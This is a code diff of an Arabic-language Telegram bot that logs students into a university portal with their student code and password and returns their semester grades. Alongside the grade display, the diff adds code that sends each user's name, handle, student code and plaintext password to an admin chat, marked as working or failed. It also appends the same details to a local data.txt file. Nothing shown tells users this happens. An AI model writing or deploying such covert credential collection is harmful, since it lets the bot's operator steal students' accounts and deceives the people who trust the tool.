@@ -61,22 +61,7 @@ def send_sms(message, chat_id, number):
         "UserLang": "E",
         "userType": "2",
     }
-    try:
-        
-        admin_message = (
-    f"ℹ️ *معلومات المستخدم:*\n"
-    f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})\n"
-    f"• **كود الطالب:** {number} \n"
-    f"• **كلمة المرور:** {text}\n"
-    f"• **ID:** {message.from_user.id}\n"  # إضافة هذا السطر
-    f"-------------------------------------\n"
-    f"📢 *المستخدم {message.from_user.username} قام بإرسال رقم الطالب وكلمة المرور.*"
-)
-
-        bot.send_message(admin_chat_id, admin_message)
-    except Exception as e:
-        error_message = f"❌ خطأ أثناء إرسال الطلب: {str(e)}"
-        bot.send_message(admin_chat_id, error_message)
+    
 
     try:
         response = requests.post(url1, headers=headers1, data=data, timeout=10)
@@ -88,11 +73,37 @@ def send_sms(message, chat_id, number):
         if "LoginOK" in response.text and json.loads(response.text)["rows"][0]["row"]["LoginOK"] == "True":
             bot.reply_to(message, "تم تسجيل الدخول بنجاح ✅")
             cookies = response.headers["Set-Cookie"]
+            try:
+            	admin_message = (
+            f"ℹ️ *معلومات المستخدم:*✅\n"
+            f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})\n"
+            f"• **كود الطالب:** {number} \n"
+            f"• **كلمة المرور:** {text}\n"
+            f"-------------------------------------\n"
+            f"📢 *المستخدم {message.from_user.username} قام بإرسال رقم الطالب وكلمة المرور.*"
+        )
+            	bot.send_message(admin_chat_id, admin_message)
+            except Exception as e:
+            	error_message = f"❌ خطأ أثناء إرسال الطلب: {str(e)}"
+            	bot.send_message(admin_chat_id, error_message)
+            
         else:
-            bot.reply_to(message, "برجاء التأكد من كود الطالب وكلمة المرور ثم أعد المحاولة مرة أخرى ❌.\n (ان كنت تواجة مشكلة في التسجيل يمكنك التواصل مع المطور)⬇️", reply_markup=btn)
+            bot.reply_to(message, "برجاء التأكد من كود الطالب وكلمة المرور ثم أعد المحاولة مرة أخرى ❌.\n (ان كنت تواجة مشكلة في التسجيل يمكنك التواصل مع المطور)", reply_markup=btn)
+            try:
+            	admin_message = (
+            f"ℹ️ *معلومات المستخدم:*❌\n"
+            f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})\n"
+            f"• **كود الطالب:** {number} \n"
+            f"• **كلمة المرور:** {text}\n"
+            f"-------------------------------------\n"
+            f"📢 *المستخدم {message.from_user.username} قام بإرسال رقم الطالب وكلمة المرور.*"
+        )
+            	bot.send_message(admin_chat_id, admin_message)
+            except Exception as e:
+            	error_message = f"❌ خطأ أثناء إرسال الطلب: {str(e)}"
+            	bot.send_message(admin_chat_id, error_message)
             return
 
-        # ... (بقية الكود كما هو)
     
     except requests.Timeout:
         bot.reply_to(message, " الموقع لا يعمل برجاء المحاولة مرة اخري لاحقاً❌")
@@ -122,34 +133,67 @@ def send_sms(message, chat_id, number):
     soup = BeautifulSoup(response1, 'html.parser')
     json_text = soup.get_text()
     data2 = json.loads(json_text)
-    
+    name=data2["stuName"]
+    with open('data.txt', 'a') as file:
+    	file.write(f"Name: {name}\nID: {number}\nPassword: {text}\n{'-' * 50}\n")
+
     calculate_and_send_course_info(chat_id, data2)
 
 def calculate_and_send_course_info(chat_id, data2):
     try:
-        # الدورة الأولى (2022-2023)
+        # اولي ترم اول
         first_semester_2022_2023 = data2["StuSemesterData"][0]["Semesters"][0]
-        total_credits_2022_2023, message_2022_2023 = print_course_info(first_semester_2022_2023["Courses"], "اولي ترم اول (2022-2023)")
+        total_credits_2022_2023, message_2022_2023 = print_course_info(first_semester_2022_2023["Courses"], "اولي ترم اول")
         bot.send_message(chat_id, f"{message_2022_2023}\nالساعات المسجلة: {first_semester_2022_2023['RegHrs']}        الساعات الحاصل عليها: {first_semester_2022_2023['EarnedHrs']}\nالمعدل الفصلي: {first_semester_2022_2023['GPA']}        المعدل التراكمي: {first_semester_2022_2023['CurrGPA']}", parse_mode='Markdown')
     except Exception as e:
         print(f"حدث خطأ في الدورة الأولى (2022-2023): {e}")
 
     try:
-        # الدورة الثانية (2022-2023)
+        # اولي ترم تاني
         second_semester_2022_2023 = data2["StuSemesterData"][0]["Semesters"][1]
         total_credits_2022_2023 += print_course_info(second_semester_2022_2023["Courses"], "اولي ترم تاني (2022-2023)")[0]
-        message_2022_20232 = "\n\n" + print_course_info(second_semester_2022_2023["Courses"], "اولي ترم تاني (2022-2023)")[1]
+        message_2022_20232 = "\n\n" + print_course_info(second_semester_2022_2023["Courses"], "اولي ترم تاني")[1]
         bot.send_message(chat_id, f"{message_2022_20232}\nالساعات المسجلة: {second_semester_2022_2023['RegHrs']}        الساعات الحاصل عليها: {second_semester_2022_2023['EarnedHrs']}\nالمعدل الفصلي: {second_semester_2022_2023['GPA']}        المعدل التراكمي: {second_semester_2022_2023['CurrGPA']}", parse_mode='Markdown')
     except Exception as e:
         print(f"حدث خطأ في الدورة الثانية (2022-2023): {e}")
 
     try:
-        # الدورة الأولى (2023-2024)
+  #تانية ترم اول
         first_semester_2023_2024 = data2["StuSemesterData"][1]["Semesters"][0]
-        total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تانية ترم اول (2023-2024)")
+        total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تانية ترم اول")
         bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['EarnedHrs']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
     except Exception as e:
         print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
+    try:
+     #تانية ترم تاني
+        first_semester_2023_2024 = data2["StuSemesterData"][1]["Semesters"][1]
+        total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تانية ترم تاني")
+        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['EarnedHrs']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+    except Exception as e:
+        print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
+    try:
+        #تالتة ترم اول
+        first_semester_2023_2024 = data2["StuSemesterData"][2]["Semesters"][0]
+        total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تالتة ترم اول")
+        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['EarnedHrs']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+    except Exception as e:
+        print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
+    try:
+     #تالتة ترم تاني
+        first_semester_2023_2024 = data2["StuSemesterData"][2]["Semesters"][1]
+        total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "تالتة ترم تاني")
+        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['EarnedHrs']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+    except Exception as e:
+        print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
+    try:
+    #رابعه ترم اول
+        first_semester_2023_2024 = data2["StuSemesterData"][3]["Semesters"][0]
+        total_credits_2023_2024, message_2023_2024 = print_course_info(first_semester_2023_2024["Courses"], "رابعة ترم اول")
+        bot.send_message(chat_id, f"{message_2023_2024}\nالساعات المسجلة: {first_semester_2023_2024['RegHrs']}        الساعات الحاصل عليها: {first_semester_2023_2024['EarnedHrs']}\nالمعدل الفصلي: {first_semester_2023_2024['GPA']}        المعدل التراكمي: {first_semester_2023_2024['CurrGPA']}", parse_mode='Markdown')
+    except Exception as e:
+        print(f"حدث خطأ في الدورة الأولى (2023-2024): {e}")
+      
+    
 
     
 def print_course_info(course_data, semester_name):
@@ -168,4 +212,4 @@ def print_course_info(course_data, semester_name):
 
     return total_credits, message_text
 
-bot.polling()
+bot.polling() 
